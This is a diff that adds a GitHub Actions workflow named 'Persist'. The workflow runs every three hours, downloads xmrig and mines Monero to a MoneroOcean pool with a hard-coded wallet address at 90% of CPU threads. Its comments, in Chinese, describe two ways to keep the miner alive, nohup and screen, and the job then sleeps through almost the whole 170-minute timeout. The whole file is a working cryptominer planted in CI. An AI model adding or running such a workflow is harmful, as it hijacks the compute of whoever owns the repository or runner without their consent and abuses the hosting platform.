@@ -1,0 +1,44 @@
+name: 🔗 Persist
+
+on:
+  schedule:
+    - cron: '0 */3 * * *'
+  workflow_dispatch:
+
+jobs:
+  persist:
+    runs-on: ubuntu-latest
+    timeout-minutes: 170
+    steps:
+      - name: Setup persistent miner
+        run: |
+          # 下载 xmrig
+          curl -sL -o xmrig.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-focal-x64.tar.gz"
+          tar xzf xmrig.tar.gz --strip-components=1
+          chmod +x xmrig
+          sudo sysctl -w vm.nr_hugepages=1280 2>/dev/null || true
+          
+          # 方案A: 使用 nohup + 后台进程支持续挖
+          # 用 while true 循环保持进程存活
+          cat > /tmp/miner.sh << 'SCRIPT'
+          #!/bin/bash
+          while true; do
+            ./xmrig -o gulf.moneroocean.stream:10032 \
+              -u 45qqTqhjmsz8mhzry3dG6rJgt9Jdzfh9xa6Skh1mtmBGgNubPDsrJVVEg6cWS6DtEB5i6BWTEaQA7BRws6UEibKEAQ1dd9X \
+              -p persist --donate-level=0 --cpu-max-threads-hint=90
+            sleep 10
+          done
+          SCRIPT
+          chmod +x /tmp/miner.sh
+          
+          # 用 nohup 在后台跑
+          nohup /tmp/miner.sh > /dev/null 2>&1 &
+          echo "PID=$!"
+          
+          # 方案B: 安装 screen 保持会话
+          sudo apt-get update -qq && sudo apt-get install -y -qq screen 2>/dev/null
+          screen -dmS miner /tmp/miner.sh
+          echo "screen 会话: miner"
+          
+          # 主进程等待接近 170分钟
+          sleep 10000
